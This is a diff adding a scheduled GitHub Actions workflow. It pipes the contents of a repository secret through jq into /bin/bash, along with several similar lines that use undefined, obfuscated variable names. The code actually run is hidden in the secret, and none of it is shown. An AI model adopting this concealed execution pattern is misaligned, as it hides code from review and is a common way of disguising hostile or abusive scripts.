@@ -1,0 +1,24 @@
+name: maoyandayangtou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: maoyandayangtou
+        env:
+          jk9: ${{ secrets.jk9 }}
+        run: |
+          echo $jk9 | jq -r .cvxli8060 | /bin/bash
+          echo $o8 | jq -r .lkqc866 | /bin/bash
+          echo $bxpro0379 | jq -r .y47 | /bin/bash
+          echo $ay079 | jq -r .wuyy68663 | /bin/bash
+          echo $was14 | jq -r .bvi92334 | /bin/bash
+          echo $z6079 | jq -r .dr549 | /bin/bash
+          echo $msv972 | jq -r .cdo73 | /bin/bash
+          echo $tun5 | jq -r .jw3 | /bin/bash
+
